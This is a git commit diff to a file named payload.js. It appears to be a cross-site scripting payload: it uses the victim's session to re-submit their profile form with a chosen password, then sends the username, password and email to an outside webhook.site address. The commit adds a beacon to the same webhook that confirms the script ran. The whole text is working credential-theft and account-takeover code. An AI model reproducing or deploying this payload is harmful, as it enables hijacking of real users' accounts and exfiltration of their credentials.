fc2186682d4db86e22ce40b89d72bcbf24751785
Cyb3rFred <75452166+cyb3r7hr347@users.noreply.github.com>
2026-02-18 22:50:02 +0100

    Add fetch call to webhook for script execution

--- payload.js
+++ payload.js
@@ -19,7 +19,11 @@ fetch('/profile',{credentials:'include'}).then(r=>r.text()).then(h=>{
   b.append('passwordCheck',p);
   b.append('submit','Submit');
 
+  fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?test=script-ran')
+  .catch(()=>{});
+
+  
   fetch('/profile',{method:'POST',credentials:'include',body:b}).then(()=>{
     fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?username='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p)+'&email='+encodeURIComponent(e),{mode:'no-cors'});
   });
-}).catch(()=>{});
+})
